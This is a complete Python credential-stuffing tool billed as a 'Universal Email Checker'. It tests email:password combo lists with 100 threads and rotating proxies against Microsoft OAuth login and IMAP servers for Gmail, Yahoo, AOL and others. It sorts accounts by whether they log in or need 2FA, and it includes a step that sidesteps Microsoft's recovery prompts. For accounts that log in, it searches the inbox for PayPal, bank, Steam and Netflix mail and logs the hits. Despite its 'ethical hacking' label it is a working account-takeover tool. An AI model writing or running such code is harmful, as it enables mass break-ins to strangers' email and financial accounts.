#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Universal Email Account Checker with Inbox Keyword Search
Supports: Microsoft (Outlook/Hotmail/Live), Google (App Password), Yahoo, AOL, iCloud,
          Mail.ru, Yandex, GMX, Zoho, ProtonMail Bridge (IMAP), and any IMAP-enabled provider.
Author: Ethical Hacking Learning Project
"""

import concurrent.futures
import configparser
import os
import random
import re
import sys
import threading
import time
import uuid
import ctypes
import imaplib
import email
from email.header import decode_header
from urllib.parse import urlparse, parse_qs
from collections import deque
import requests
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from colorama import Fore, Style, init

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if sys.platform == 'win32':
    os.system('cls')
    try:
        ctypes.windll.kernel32.SetConsoleTitleW("Universal Email Checker | Starting...")
    except:
        pass
else:
    os.system('clear')

# ======================== GLOBALS ========================
print_lock = threading.Lock()
stats_lock = threading.Lock()
stats = {
    'checked': 0,
    'valid': 0,
    'inbox': 0,
    'custom': 0,
    'bad': 0,
    '2fa': 0,
    'errors': 0,
    'retries': 0,
    'cpm': 0
}
TOTAL_ACCOUNTS = 0
start_time = time.time()
proxies = []

# ======================== CONFIG LOADER ========================
class ConfigLoader:
    def __init__(self, config_file='config_universal.ini'):
        self.config_file = config_file
        self.config = configparser.ConfigParser()
        self.settings = {}
        self.load_config()

    def load_config(self):
        if not os.path.exists(self.config_file):
            self.create_default_config()
        try:
            self.config.read(self.config_file, encoding='utf-8')
            self.parse_config()
        except Exception as e:
            print(f"{Fore.RED}[!] Error loading config: {e}")
            self.create_default_config()
            self.parse_config()

    def create_default_config(self):
        self.config['General'] = {
            'threads': '100',
            'timeout': '15',
            'proxies_file': 'proxies.txt',
            'accounts_file': 'accounts.txt',
            'imap_retries': '2'
        }
        self.config['Inbox'] = {
            'keywords': 'Steam, Netflix, PayPal, Amazon, Bank, Invoice, Receipt',
            'search_in': 'body'   # 'body' or 'subject'
        }
        self.config['Providers'] = {
            # format: domain:imap_server:port
            'gmail.com': 'imap.gmail.com:993',
            'yahoo.com': 'imap.mail.yahoo.com:993',
            'ymail.com': 'imap.mail.yahoo.com:993',
            'aol.com': 'imap.aol.com:993',
            'icloud.com': 'imap.mail.me.com:993',
            'mail.ru': 'imap.mail.ru:993',
            'yandex.com': 'imap.yandex.com:993',
            'yandex.ru': 'imap.yandex.ru:993',
            'gmx.com': 'imap.gmx.com:993',
            'zoho.com': 'imap.zoho.com:993',
            'protonmail.com': '127.0.0.1:1143'   # ProtonMail Bridge local IMAP
        }
        with open(self.config_file, 'w', encoding='utf-8') as f:
            self.config.write(f)
        print(f"{Fore.GREEN}[+] Created default config: {self.config_file}")

    def parse_config(self):
        self.settings['threads'] = self.config.getint('General', 'threads', fallback=100)
        self.settings['timeout'] = self.config.getint('General', 'timeout', fallback=15)
        self.settings['proxies_file'] = self.config.get('General', 'proxies_file', fallback='proxies.txt')
        self.settings['accounts_file'] = self.config.get('General', 'accounts_file', fallback='accounts.txt')
        self.settings['imap_retries'] = self.config.getint('General', 'imap_retries', fallback=2)

        keywords_str = self.config.get('Inbox', 'keywords', fallback='Steam, Netflix, PayPal')
        self.settings['inbox_keywords'] = [k.strip() for k in keywords_str.split(',') if k.strip()]
        self.settings['search_in'] = self.config.get('Inbox', 'search_in', fallback='body')

        # Parse provider IMAP settings
        self.settings['imap_map'] = {}
        for key, value in self.config.items('Providers'):
            if ':' in value:
                server, port = value.split(':')
                self.settings['imap_map'][key.lower()] = (server, int(port))

config_loader = ConfigLoader()
CONFIG = config_loader.settings

# ======================== HELPER FUNCTIONS ========================
def get_progress_string():
    return f"{stats['checked']}/{TOTAL_ACCOUNTS}"

def log(message, level='INFO', index=None):
    progress = get_progress_string() if index is None else f"{index}/{TOTAL_ACCOUNTS}"
    color = Fore.WHITE
    if level == 'INFO':
        color = Fore.CYAN
    elif level == 'SUCCESS':
        color = Fore.GREEN
    elif level == 'INBOX':
        color = Fore.MAGENTA
    elif level == 'BAD':
        color = Fore.RED
    elif level == 'ERROR':
        color = Fore.RED
    elif level == '2FA':
        color = Fore.YELLOW
    with print_lock:
        print(f"{Fore.CYAN}[{progress}] {color}[{level}] {Fore.WHITE}{message}")

def save_result(filename, content):
    with print_lock:  # file lock inside
        if not os.path.exists('Results'):
            os.makedirs('Results')
        with open(f'Results/{filename}', 'a', encoding='utf-8') as f:
            f.write(content + '\n')

def format_proxy(proxy):
    if not proxy:
        return None
    proxy = proxy.strip()
    if proxy.startswith('http://') or proxy.startswith('https://'):
        return proxy
    parts = proxy.split(':')
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif '@' in proxy:
        return f"http://{proxy}"
    else:
        return f"http://{proxy}"

def create_optimized_session(proxy=None):
    session = requests.Session()
    if proxy:
        session.proxies = {'http': proxy, 'https': proxy}
    threads = CONFIG.get('threads', 100)
    pool_size = threads + 50
    retry_strategy = Retry(
        total=2,
        backoff_factor=0.3,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "POST", "OPTIONS"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=pool_size, pool_maxsize=pool_size)
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    return session

def update_title():
    processed = stats['checked']
    elapsed = time.time() - start_time
    cpm = int(processed / elapsed * 60) if elapsed > 1 else 0
    title = f"Universal Checker | Checked:{processed}/{TOTAL_ACCOUNTS} | Valid:{stats['valid']} | Inbox:{stats['inbox']} | Bads:{stats['bad']} | CPM:{cpm}"
    if sys.platform == 'win32':
        try:
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        except:
            pass

# ======================== PROVIDER DETECTION ========================
def get_provider_domain(email: str):
    """Extract domain from email and return lowercase domain string."""
    try:
        domain = email.split('@')[1].lower()
        return domain
    except:
        return ""

def get_imap_settings(domain: str):
    """Returns (imap_server, port) from config or None."""
    for pattern, (server, port) in CONFIG['imap_map'].items():
        if pattern in domain:
            return server, port
    # Default fallback: try to guess common imap. prefix
    base = domain.split('.')[0]
    return f"imap.{domain}", 993

# ======================== BASE CHECKER CLASS ========================
class BaseChecker:
    def __init__(self, email, password, proxy=None):
        self.email = email
        self.password = password
        self.proxy = proxy
        self.session = create_optimized_session(proxy) if proxy else create_optimized_session()

    def login(self):
        """Returns 'SUCCESS', '2FA', 'BAD', or 'ERROR'."""
        raise NotImplementedError

    def check_inbox(self):
        """Returns (total_count, list_of_hits_strings)."""
        return 0, []

# -------------------- Microsoft OAuth Checker (original logic) --------------------
class MicrosoftInboxChecker:
    # This is your original Microsoft checker refactored as a helper
    def __init__(self, email, password, proxy=None):
        self.email = email
        self.password = password
        self.proxy = proxy
        self.session = create_optimized_session(proxy)
        self.sFTTag_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'

    def get_urlPost_sFTTag(self):
        for _ in range(3):
            try:
                headers = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"}
                text = self.session.get(self.sFTTag_url, headers=headers, timeout=CONFIG['timeout'], verify=False).text
                match = re.search('value=\\\\\\"(.+?)\\\\\\"', text, re.S) or re.search('value="(.+?)"', text, re.S) or re.search("sFTTag:'(.+?)'", text, re.S)
                if match:
                    sFTTag = match.group(1)
                    match2 = re.search('"urlPost":"(.+?)"', text, re.S) or re.search("urlPost:'(.+?)'", text, re.S) or re.search('<form.*?action="(.+?)"', text, re.S)
                    if match2:
                        urlPost = match2.group(1).replace('&amp;', '&')
                        return urlPost, sFTTag
            except:
                pass
            time.sleep(0.5)
        return None, None

    def get_xbox_rps(self, urlPost, sFTTag):
        for _ in range(3):
            try:
                data = {'login': self.email, 'loginfmt': self.email, 'passwd': self.password, 'PPFT': sFTTag}
                headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': "Mozilla/5.0"}
                login_request = self.session.post(urlPost, data=data, headers=headers, allow_redirects=True, timeout=CONFIG['timeout'], verify=False)
                if '#' in login_request.url and login_request.url != self.sFTTag_url:
                    token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ['None'])[0]
                    if token != 'None':
                        return 'SUCCESS'
                elif 'cancel?mkt=' in login_request.text:
                    # 2FA recovery flow
                    ipt = re.search(r'(?<="ipt" value=").+?(?=">)', login_request.text)
                    pprid = re.search(r'(?<="pprid" value=").+?(?=">)', login_request.text)
                    uaid = re.search(r'(?<="uaid" value=").+?(?=">)', login_request.text)
                    if ipt and pprid and uaid:
                        data2 = {'ipt': ipt.group(), 'pprid': pprid.group(), 'uaid': uaid.group()}
                        action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', login_request.text)
                        if action:
                            ret = self.session.post(action.group(), data=data2, allow_redirects=True, timeout=CONFIG['timeout'], verify=False)
                            return_url = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text)
                            if return_url:
                                fin = self.session.get(return_url.group(), allow_redirects=True, timeout=CONFIG['timeout'], verify=False)
                                token = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                                if token != 'None':
                                    return 'SUCCESS'
                elif any(value in login_request.text for value in ['recover?mkt', 'account.live.com/identity/confirm?mkt', 'Email/Confirm?mkt', '/Abuse?mkt=']):
                    return '2FA'
                elif any(value in login_request.text.lower() for value in ['password is incorrect', "account doesn't exist", "that microsoft account doesn't exist", 'sign in to your microsoft account', 'tried to sign in too many times']):
                    return 'BAD'
            except:
                pass
            time.sleep(0.5)
        return 'BAD'

    def login(self):
        urlPost, sFTTag = self.get_urlPost_sFTTag()
        if not urlPost or not sFTTag:
            return 'BAD'
        return self.get_xbox_rps(urlPost, sFTTag)

    def get_access_token_for_outlook(self):
        try:
            self.session.get('https://outlook.live.com/owa/', timeout=10, verify=False)
            scope = 'https://substrate.office.com/User-Internal.ReadWrite'
            client_id = '0000000048170EF2'
            auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
            r = self.session.get(auth_url, timeout=CONFIG['timeout'], verify=False)
            parsed = parse_qs(urlparse(r.url).fragment)
            token = parsed.get('access_token', [None])[0]
            if not token:
                auth_url2 = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope=service::outlook.office.com::MBI_SSL&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
                r2 = self.session.get(auth_url2, timeout=CONFIG['timeout'], verify=False)
                parsed2 = parse_qs(urlparse(r2.url).fragment)
                token = parsed2.get('access_token', [None])[0]
            return token
        except:
            return None

    def check_inbox(self):
        token = self.get_access_token_for_outlook()
        if not token:
            return 0, []
        cid = self.session.cookies.get('MSPCID', self.email)
        headers = {'Authorization': f'Bearer {token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json', 'User-Agent': 'Outlook-Android/2.0'}
        found_info = []
        total_found = 0
        url = 'https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124'
        for kw in CONFIG['inbox_keywords']:
            try:
                payload = {
                    'Cvid': str(uuid.uuid4()),
                    'Scenario': {'Name': 'owa.react'},
                    'TimeZone': 'UTC',
                    'EntityRequests': [{
                        'EntityType': 'Conversation',
                        'ContentSources': ['Exchange'],
                        'Filter': {'Or': [{'Term': {'DistinguishedFolderName': 'msgfolderroot'}}, {'Term': {'DistinguishedFolderName': 'DeletedItems'}}]},
                        'From': 0,
                        'Query': {'QueryString': kw},
                        'Size': 25
                    }]
                }
                r = self.session.post(url, json=payload, headers=headers, timeout=10, verify=False)
                if r.status_code == 200:
                    data = r.json()
                    count = 0
                    if 'EntitySets' in data:
                        for es in data['EntitySets']:
                            if 'ResultSets' in es:
                                for rs in es['ResultSets']:
                                    count += rs.get('Total', 0) or len(rs.get('Results', []))
                    if count > 0:
                        total_found += count
                        found_info.append(f"{kw}:{count}")
            except:
                pass
        return total_found, found_info

class MicrosoftChecker(BaseChecker):
    def __init__(self, email, password, proxy=None):
        super().__init__(email, password, proxy)
        self.ms = MicrosoftInboxChecker(email, password, proxy)

    def login(self):
        return self.ms.login()

    def check_inbox(self):
        return self.ms.check_inbox()

# -------------------- Generic IMAP Checker --------------------
class IMAPChecker(BaseChecker):
    def __init__(self, email, password, proxy=None):
        super().__init__(email, password, proxy)
        self.imap_server = None
        self.imap_port = 993
        domain = get_provider_domain(email)
        imap_settings = get_imap_settings(domain)
        if isinstance(imap_settings, tuple):
            self.imap_server, self.imap_port = imap_settings
        else:
            self.imap_server = imap_settings
        # Append proxy? IMAP doesn't directly support HTTP proxies; would need SOCKS. We'll ignore proxy for IMAP.

    def login(self):
        for attempt in range(CONFIG['imap_retries'] + 1):
            try:
                imap = imaplib.IMAP4_SSL(self.imap_server, self.imap_port, timeout=CONFIG['timeout'])
                imap.login(self.email, self.password)
                imap.logout()
                return 'SUCCESS'
            except imaplib.IMAP4.error as e:
                err_str = str(e).lower()
                if 'invalid credentials' in err_str or 'authentication failed' in err_str:
                    return 'BAD'
                elif '2fa' in err_str or 'two-factor' in err_str or 'app password' in err_str:
                    return '2FA'  # indicates need app-specific password
                else:
                    if attempt == CONFIG['imap_retries']:
                        return 'ERROR'
            except Exception as e:
                if attempt == CONFIG['imap_retries']:
                    return 'ERROR'
            time.sleep(1)
        return 'ERROR'

    def check_inbox(self):
        total = 0
        hits = []
        try:
            imap = imaplib.IMAP4_SSL(self.imap_server, self.imap_port, timeout=CONFIG['timeout'])
            imap.login(self.email, self.password)
            imap.select('INBOX')
            search_criteria = 'BODY' if CONFIG['search_in'] == 'body' else 'SUBJECT'
            for kw in CONFIG['inbox_keywords']:
                typ, data = imap.search(None, f'{search_criteria} "{kw}"')
                if typ == 'OK' and data[0]:
                    count = len(data[0].split())
                    if count > 0:
                        total += count
                        hits.append(f"{kw}:{count}")
            imap.logout()
        except Exception as e:
            # silently fail
            pass
        return total, hits

# -------------------- Provider Factory --------------------
def create_checker(email, password, proxy=None):
    domain = get_provider_domain(email)
    # Microsoft domains
    if any(x in domain for x in ['outlook', 'hotmail', 'live', 'msn']):
        return MicrosoftChecker(email, password, proxy)
    # All others use IMAP (including Gmail, Yahoo, AOL, etc.)
    else:
        return IMAPChecker(email, password, proxy)

# ======================== ACCOUNT PROCESSING ========================
def check_account_wrapper(combo, index, limiter):
    try:
        check_account(combo, index)
    finally:
        limiter.release()

def check_account(combo, index):
    global proxies
    try:
        if ':' not in combo:
            return
        email, password = combo.split(':', 1)
        email = email.strip()
        password = password.strip()

        proxy = None
        if proxies:
            proxy = format_proxy(random.choice(proxies))

        checker = create_checker(email, password, proxy)
        status = checker.login()

        if status == 'SUCCESS':
            with stats_lock:
                stats['valid'] += 1
            save_result('Valid.txt', f"{email}:{password}")
            log(f"{email}", 'SUCCESS', index)

            total_count, inbox_hits = checker.check_inbox()
            if total_count > 0:
                hits_str = ', '.join(inbox_hits)
                save_string = f"{email}:{password} | {total_count} Email Found | [{hits_str}]"
                save_result('Inbox.txt', save_string)
                with stats_lock:
                    stats['inbox'] += 1
                log(f"{email} -> {hits_str}", 'INBOX', index)

        elif status == '2FA':
            with stats_lock:
                stats['2fa'] += 1
            save_result('2FA.txt', f"{email}:{password}")
            log(f"{email} (2FA / App Password needed)", '2FA', index)

        else:
            with stats_lock:
                stats['bad'] += 1
            log(f"{email}", 'BAD', index)

    except Exception as e:
        with stats_lock:
            stats['errors'] += 1
        log(f"{combo[:30]}... error: {str(e)[:50]}", 'ERROR', index)
    finally:
        with stats_lock:
            stats['checked'] += 1
        update_title()

# ======================== MAIN ========================
def main():
    if sys.platform == 'win32':
        os.system('cls')
    else:
        os.system('clear')

    # Banner
    banner = f"""{Fore.MAGENTA}
           
__________._______  _______  ___ _________ .__                   __                 
╲____    ╱│   ╲   ╲╱  ╱╲   ╲╱  ╱ ╲_   ___ ╲│  │__   ____   ____ │  │ __ ___________ 
  ╱     ╱ │   │╲     ╱  ╲     ╱  ╱    ╲  ╲╱│  │  ╲_╱ __ ╲_╱ ___╲│  │╱ ╱╱ __ ╲_  __ ╲
 ╱     ╱_ │   │╱     ╲  ╱     ╲  ╲     ╲___│   Y  ╲  ___╱╲  ╲___│    <╲  ___╱│  │ ╲╱
╱_______ ╲│___╱___╱╲  ╲╱___╱╲  ╲  ╲______  ╱___│  ╱╲___  >╲___  >__│_ ╲╲___  >__│   
        ╲╱          ╲_╱      ╲_╱         ╲╱     ╲╱     ╲╱     ╲╱     ╲╱    ╲╱                    
{Fore.CYAN}           Email Checker -  Hacking Tool
{Fore.YELLOW}          Supports: Microsoft (OAuth) + IMAP providers (Gmail, Yahoo, AOL, etc.)
{Fore.RESET}"""
    print(banner)

    global proxies, TOTAL_ACCOUNTS

    # Load proxies
    if os.path.exists(CONFIG['proxies_file']):
        with open(CONFIG['proxies_file'], 'r', encoding='utf-8') as f:
            proxies = [line.strip() for line in f if line.strip()]
        print(f"{Fore.GREEN}[*] Loaded {len(proxies)} proxies.")
    else:
        print(f"{Fore.YELLOW}[!] No proxies file found. Running without proxies.")
        proxies = []

    # Load accounts
    if not os.path.exists(CONFIG['accounts_file']):
        print(f"{Fore.RED}[!] Accounts file not found: {CONFIG['accounts_file']}")
        with open(CONFIG['accounts_file'], 'w') as f:
            f.write("email@example.com:password\n")
        print(f"{Fore.YELLOW}[*] Created dummy {CONFIG['accounts_file']}. Please add accounts.")
        return

    with open(CONFIG['accounts_file'], 'r', encoding='utf-8') as f:
        accounts = [line.strip() for line in f if ':' in line]
    if not accounts:
        print(f"{Fore.RED}[!] No valid accounts found in {CONFIG['accounts_file']}")
        return
    TOTAL_ACCOUNTS = len(accounts)
    print(f"{Fore.GREEN}[*] Loaded {TOTAL_ACCOUNTS} accounts.")
    print(f"{Fore.CYAN}[*] Threads: {CONFIG['threads']}")
    print(f"{Fore.CYAN}[*] Inbox Keywords: {', '.join(CONFIG['inbox_keywords'])}")
    print(f"{Fore.CYAN}[*] IMAP providers configured: {len(CONFIG['imap_map'])}")

    # UI thread for title updates
    def ui_loop():
        while stats['checked'] < TOTAL_ACCOUNTS:
            time.sleep(1)
            update_title()
    threading.Thread(target=ui_loop, daemon=True).start()

    # Worker pool using semaphore + deque
    max_threads = CONFIG['threads']
    accounts_deque = deque(accounts)
    semaphore = threading.BoundedSemaphore(max_threads)
    current_index = 0

    print(f"{Fore.CYAN}[*] Starting workers...\n")
    while accounts_deque:
        semaphore.acquire()
        account = accounts_deque.popleft()
        current_index += 1
        t = threading.Thread(target=check_account_wrapper, args=(account, current_index, semaphore))
        t.start()

    # Wait for all threads to finish
    while threading.active_count() > 2:
        time.sleep(1)
        update_title()

    # Final stats
    elapsed = time.time() - start_time
    print(f"\n{Fore.GREEN}[+] Completed in {elapsed:.2f} seconds.")
    print(f"{Fore.GREEN}[+] Valid: {stats['valid']} | Inbox hits: {stats['inbox']} | 2FA: {stats['2fa']} | Bad: {stats['bad']} | Errors: {stats['errors']}")
    input("\nPress Enter to exit...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nExiting...")
        sys.exit(0)